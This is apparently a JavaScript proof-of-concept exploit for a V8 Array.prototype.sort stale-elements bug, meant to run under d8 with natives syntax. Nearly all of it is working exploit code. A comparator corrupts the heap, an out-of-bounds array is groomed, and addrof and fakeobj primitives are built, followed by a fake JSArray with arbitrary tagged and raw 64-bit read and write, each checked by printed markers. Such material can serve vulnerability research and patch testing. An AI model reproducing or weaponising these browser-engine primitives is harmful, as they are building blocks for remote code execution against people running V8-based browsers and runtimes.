// Exploitability PoC for the inline Array.prototype.sort stale-elements bug.
//
// This is a diagnostic/stabilized primitive PoC. It uses V8 natives syntax only
// to force TurboFan compilation of sortVictim. The original no-flags package
// already demonstrates JS-reachable native heap corruption; this file upgrades
// the consequence to deterministic addrof/fakeobj plus tagged read/write inside
// the pointer-compression cage.
//
// Run:
//   out/x64.release/d8 --allow-natives-syntax \
//     /kb/v8-general/jit/incoming-bugs/array_sort_cow_write.lefttrim-addrof-fakeobj-arbtaggedrw-poc.js

let victim;
let did_mutate;

const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u64 = new BigUint64Array(buf);
function ftoi(x) { f64[0] = x; return u64[0]; }
function itof(x) { u64[0] = x; return f64[0]; }
function hex(x) { return '0x' + x.toString(16); }
function smi(x) { return BigInt(x) << 1n; }

function makeLargeCapacityPackedObjectArray() {
  const a = [];

  // Force PACKED_ELEMENTS so the post-corruption OOB array can store object
  // pointers, not only Smis. The object is removed; the elements-kind
  // transition sticks.
  a.push({force_object_elements: 1});
  a.pop();

  for (let i = 0; i < 236; i++) a.push(1000 + i);

  // Leaves length 16 with a large non-COW FixedArray backing.
  a.splice(16);
  return a;
}

function corruptingComparator(a, b) {
  if (!did_mutate) {
    did_mutate = true;
    for (let i = 0; i < 220; i++) victim.push(2000 + i);
    victim.shift();
    victim.length = 16;
  }
  return a - b;
}

function sortVictim(a) {
  did_mutate = false;
  victim = a;
  victim.sort(corruptingComparator);
  return victim;
}

%PrepareFunctionForOptimization(corruptingComparator);
%PrepareFunctionForOptimization(sortVictim);
for (let i = 0; i < 300; i++) sortVictim(makeLargeCapacityPackedObjectArray());
%OptimizeFunctionOnNextCall(sortVictim);

let oob = makeLargeCapacityPackedObjectArray();
let target = [];
target.push(0x1111);
target.push(0x2222);

let obj0 = {tag: 0x1337};
let obj1 = {tag: 0x2448};
let objarr = [obj0, obj1, 0x3333, 0x4444];
let dblarr = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6];

sortVictim(oob);
print('status sortVictim=' + %GetOptimizationStatus(sortVictim));

// Promote the corrupted backing length into JSArray.length without growing the
// physically right-trimmed backing. 900 is below the forged capacity and still
// reaches the groomed neighbor.
oob.length = 900;

// Deterministic layout for this allocation shape:
//   oob[579] -> a PACKED_ELEMENTS JSArray Map object
//   oob[580] -> empty FixedArray properties object
//   oob[591] -> target.elements field
//   oob[592] -> target.length field
const PACKED_ELEMENTS_MAP_SLOT = 579;
const EMPTY_PROPERTIES_SLOT = 580;
const TARGET_ELEMENTS_SLOT = 591;
const TARGET_LENGTH_SLOT = 592;

function pointTargetAt(jsarray, len) {
  oob[TARGET_ELEMENTS_SLOT] = jsarray;
  oob[TARGET_LENGTH_SLOT] = len;
}
function leakElements(jsarray) {
  pointTargetAt(jsarray, 4);
  return target[0];
}
function writeElements(jsarray, elementsObj) {
  pointTargetAt(jsarray, 4);
  target[0] = elementsObj;
}

let packedElementsMap = oob[PACKED_ELEMENTS_MAP_SLOT];
let emptyFixedArray = oob[EMPTY_PROPERTIES_SLOT];
let objElements = leakElements(objarr);
let dblElements = leakElements(dblarr);

function addrof(o) {
  writeElements(dblarr, objElements);
  objarr[0] = o;
  objarr[1] = obj1;
  const bits = ftoi(dblarr[0]);
  writeElements(dblarr, dblElements);
  return bits & 0xffffffffn;
}

const obj1AddrForFake = addrof(obj1);
function fakeobj(addr32) {
  writeElements(objarr, dblElements);
  dblarr[0] = itof((obj1AddrForFake << 32n) | (addr32 & 0xffffffffn));
  const o = objarr[0];
  writeElements(objarr, objElements);
  return o;
}

const mapAddr = addrof(packedElementsMap);
const propsAddr = addrof(emptyFixedArray);
const elemsAddr = addrof(objElements);
const dblElemsAddr = addrof(dblElements);
const fakeAddr = (dblElemsAddr + 16n) & 0xffffffffn;

// Materialize a fake JSArray at FixedDoubleArray data + 16. dblarr[0] remains
// reserved for fakeobj pointer materialization; dblarr[1]/dblarr[2] are the
// fake object's four compressed fields: map, properties, elements, length.
writeElements(dblarr, dblElements);
dblarr[1] = itof((propsAddr << 32n) | mapAddr);
dblarr[2] = itof((smi(4) << 32n) | elemsAddr);
const fake = fakeobj(fakeAddr);

function setFakeElements(addr32, len) {
  dblarr[2] = itof((smi(len) << 32n) | (addr32 & 0xffffffffn));
}
function arbReadTagged(addr32) {
  setFakeElements((addr32 - 8n) & 0xffffffffn, 4);
  return fake[0];
}
function arbWriteTagged(addr32, value) {
  setFakeElements((addr32 - 8n) & 0xffffffffn, 4);
  fake[0] = value;
}

const objarr2SlotAddr = (elemsAddr + 16n) & 0xffffffffn;
const before = arbReadTagged(objarr2SlotAddr);
print('compressed objElements=' + hex(elemsAddr));
print('compressed dblElements=' + hex(dblElemsAddr));
print('compressed fake=' + hex(fakeAddr));
print('addrof(obj0)=' + hex(addrof(obj0)));
print('fake.length=' + fake.length);
print('arbRead(objarr[2])=' + before);

arbWriteTagged(objarr2SlotAddr, 0x7777);
print('after smi write objarr[2]=' + objarr[2]);

const marker = {rw_marker: 0x5151};
arbWriteTagged(objarr2SlotAddr, marker);
print('after object write marker=' + objarr[2].rw_marker);

if (fake.length !== 4 || before !== 0x3333 ||
    objarr[2].rw_marker !== 0x5151) {
  throw new Error('primitive check failed');
}

print('ARB_TAGGED_RW_OK');

// Upgrade tagged R/W to raw 64-bit in-cage R/W with a fake double JSArray.
// The address below targets dblarr[4]'s own FixedDoubleArray slot as a safe
// validation sink; the primitive accepts any compressed in-cage address.
const dblarrAddr = addrof(dblarr);
const packedDoubleMap = arbReadTagged(dblarrAddr);
const doubleMapAddr = addrof(packedDoubleMap);
function setFakeDoubleElementsForAddress(addr32, len) {
  dblarr[1] = itof((propsAddr << 32n) | doubleMapAddr);
  dblarr[2] = itof((smi(len) << 32n) | ((addr32 - 8n) & 0xffffffffn));
}
function arbRead64(addr32) {
  setFakeDoubleElementsForAddress(addr32, 4);
  return ftoi(fake[0]);
}
function arbWrite64(addr32, bits) {
  setFakeDoubleElementsForAddress(addr32, 4);
  fake[0] = itof(bits);
}

const dblarr4Addr = (dblElemsAddr + 8n + 4n * 8n) & 0xffffffffn;
const before64 = arbRead64(dblarr4Addr);
print('doubleMap=' + hex(doubleMapAddr));
print('arbRead64(dblarr[4])=' + hex(before64));
arbWrite64(dblarr4Addr, 0x4142434445464748n);
print('after raw64 write dblarr[4]=' + hex(ftoi(dblarr[4])));
if (ftoi(dblarr[4]) !== 0x4142434445464748n) {
  throw new Error('raw64 primitive check failed');
}
print('ARB_RAW64_RW_OK');
